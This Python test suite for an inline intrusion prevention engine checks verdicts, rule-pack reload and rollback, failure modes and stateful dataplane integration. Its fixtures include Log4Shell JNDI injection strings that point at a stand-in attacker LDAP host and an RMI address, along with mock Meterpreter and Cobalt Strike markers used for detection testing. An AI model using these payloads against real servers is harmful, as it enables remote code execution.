"""Unit and integration test suite for Phase 9: Production Inline IPS Architecture.
Validates deterministic verdicts (PASS, ALERT, DROP, RESET, QUARANTINE),
fail-open vs fail-closed failure modes, versioned rule pack hot-reload/rollback,
and deep integration with StatefulDataplane.
"""
import pytest
from sentinelfw.ips import (
    IPSAction,
    IPSFailureMode,
    IPSRule,
    IPSRulePackManager,
    InlineIPSEngine,
)
from sentinelfw.stateful_engine import StatefulDataplane


def test_ips_verdict_actions():
    """Verify standard signature hits produce expected deterministic actions."""
    engine = InlineIPSEngine()

    # 1. Clean packet -> PASS
    clean_pkt = {
        "proto": "tcp",
        "src_ip": "10.0.0.5",
        "dst_ip": "10.0.0.1",
        "src_port": 50000,
        "dst_port": 80,
        "payload": b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n",
    }
    v_clean = engine.inspect_packet(clean_pkt)
    assert v_clean["action"] == IPSAction.PASS
    assert v_clean["rule_id"] is None

    # 2. Log4j RCE -> DROP (Severity 1, CVE-2021-44228)
    log4j_pkt = {
        "proto": "tcp",
        "src_ip": "198.51.100.22",
        "dst_ip": "10.0.0.1",
        "src_port": 44123,
        "dst_port": 8080,
        "payload": b"GET /login?user=${jndi:ldap://evil-ldap.com:1389/Exploit} HTTP/1.1\r\n\r\n",
    }
    v_log4j = engine.inspect_packet(log4j_pkt)
    assert v_log4j["action"] == IPSAction.DROP
    assert "CVE-2021-44228" in v_log4j["cve_refs"]
    assert "T1190" in v_log4j["mitre_attack"]
    assert engine.stats["packets_dropped"] == 1

    # 3. Meterpreter stage handshake -> RESET
    meterpreter_pkt = {
        "proto": "tcp",
        "src_ip": "203.0.113.88",
        "dst_ip": "10.0.0.1",
        "src_port": 4444,
        "dst_port": 4444,
        "payload": b"\x00\x00\x00\x0c\x90\x90meterpreter_stage_payload_data",
    }
    v_meterpreter = engine.inspect_packet(meterpreter_pkt)
    assert v_meterpreter["action"] == IPSAction.RESET
    assert engine.stats["packets_reset"] == 1

    # 4. Cobalt Strike beacon watermark -> QUARANTINE
    beacon_pkt = {
        "proto": "tcp",
        "src_ip": "192.168.1.105",
        "dst_ip": "10.0.0.1",
        "src_port": 49152,
        "dst_port": 443,
        "payload": b"POST /api HTTP/1.1\r\n\r\ncobaltstrike_beacon_watermark=corp-compromise",
    }
    v_beacon = engine.inspect_packet(beacon_pkt)
    assert v_beacon["action"] == IPSAction.QUARANTINE
    assert "192.168.1.105" in engine.quarantined_hosts

    # Subsequent packet from quarantined host is automatically dropped
    clean_from_quarantined = {
        "proto": "tcp",
        "src_ip": "192.168.1.105",
        "dst_ip": "10.0.0.1",
        "src_port": 49153,
        "dst_port": 80,
        "payload": b"GET /clean.html HTTP/1.1\r\n\r\n",
    }
    v_sub = engine.inspect_packet(clean_from_quarantined)
    assert v_sub["action"] == IPSAction.DROP
    assert "quarantine" in v_sub["reason"].lower()


def test_ips_rule_pack_hot_reload_and_rollback():
    """Verify versioned rule pack hot-reload and atomic rollback."""
    mgr = IPSRulePackManager(version="v1.0.0")
    initial_count = mgr.get_rule_count()
    assert initial_count > 0

    # Hot-reload with custom rule pack v1.1.0
    custom_rules = [
        {
            "rule_id": 9001,
            "name": "CUSTOM Attack Signature 9001",
            "pattern": r"MALICIOUS_PAYLOAD_ABC",
            "action": IPSAction.DROP,
        },
        {
            "rule_id": 9002,
            "name": "CUSTOM Attack Signature 9002",
            "pattern": r"MALICIOUS_PAYLOAD_XYZ",
            "action": IPSAction.RESET,
        },
    ]
    reloaded = mgr.hot_reload(custom_rules, new_version="v1.1.0")
    assert reloaded is True
    assert mgr.version == "v1.1.0"
    assert mgr.get_rule_count() == 2

    # Malformed rule reload fails safely and preserves active rules
    bad_rules = [{"rule_id": 9999, "name": "Bad Regex", "pattern": r"[unclosed_bracket"}]
    bad_reload = mgr.hot_reload(bad_rules, new_version="v1.2.0-broken")
    assert bad_reload is False
    assert mgr.version == "v1.1.0"
    assert mgr.get_rule_count() == 2

    # Rollback restores v1.0.0
    rolled_back = mgr.rollback()
    assert rolled_back is True
    assert mgr.version == "v1.0.0"
    assert mgr.get_rule_count() == initial_count


def test_ips_failure_modes():
    """Verify fail-open vs fail-closed behaviors on engine exceptions."""
    # 1. Fail-Open engine
    engine_open = InlineIPSEngine(failure_mode=IPSFailureMode.FAIL_OPEN)
    # Simulate internal error by sabotaging rule collection with invalid mock
    class SabotagedRules:
        def __iter__(self):
            raise RuntimeError("Hardware ASIC packet parsing bus error")
    engine_open.rule_pack.rules = SabotagedRules()

    pkt = {"proto": "tcp", "src_ip": "1.1.1.1", "dst_ip": "2.2.2.2", "payload": b"hello"}
    v_open = engine_open.inspect_packet(pkt)
    assert v_open["action"] == IPSAction.PASS
    assert "fail_open" in v_open["reason"]
    assert engine_open.stats["fail_open_events"] == 1

    # 2. Fail-Closed engine
    engine_closed = InlineIPSEngine(failure_mode=IPSFailureMode.FAIL_CLOSED)
    engine_closed.rule_pack.rules = SabotagedRules()

    v_closed = engine_closed.inspect_packet(pkt)
    assert v_closed["action"] == IPSAction.DROP
    assert "fail_closed" in v_closed["reason"]
    assert engine_closed.stats["fail_closed_events"] == 1


def test_stateful_dataplane_ips_integration():
    """Verify that StatefulDataplane drops packets matching inline IPS signatures."""
    ips = InlineIPSEngine()
    dataplane = StatefulDataplane(ips_engine=ips)

    # 1. Establish normal TCP handshake
    src = "192.168.10.50"
    dst = "10.0.0.80"
    # SYN
    v1, _, s1 = dataplane.process_packet(src, dst, "tcp", 49152, 80, {"syn": True}, seq=100)
    assert v1 == "ALLOW"
    # SYN-ACK
    v2, _, s2 = dataplane.process_packet(dst, src, "tcp", 80, 49152, {"syn": True, "ack": True}, seq=500, ack=101)
    assert v2 == "ALLOW"
    # ACK -> ESTABLISHED
    v3, _, s3 = dataplane.process_packet(src, dst, "tcp", 49152, 80, {"ack": True}, seq=101, ack=501)
    assert v3 == "ALLOW"
    assert s3.state == "ESTABLISHED"

    # 2. Clean data packet inside established session -> ALLOW
    clean_data = b"GET /index.php HTTP/1.1\r\nHost: example.com\r\n\r\n"
    v_clean, _, _ = dataplane.process_packet(src, dst, "tcp", 49152, 80, {"ack": True}, seq=101, ack=501, payload=clean_data)
    assert v_clean == "ALLOW"

    # 3. Log4j exploit payload inside established session -> DROP by IPS
    exploit_data = b"GET /index.php?param=${jndi:rmi://198.51.100.1/a} HTTP/1.1\r\n\r\n"
    v_drop, reason_drop, _ = dataplane.process_packet(src, dst, "tcp", 49152, 80, {"ack": True}, seq=150, ack=501, payload=exploit_data)
    assert v_drop == "DROP"
    assert "IPS Block" in reason_drop
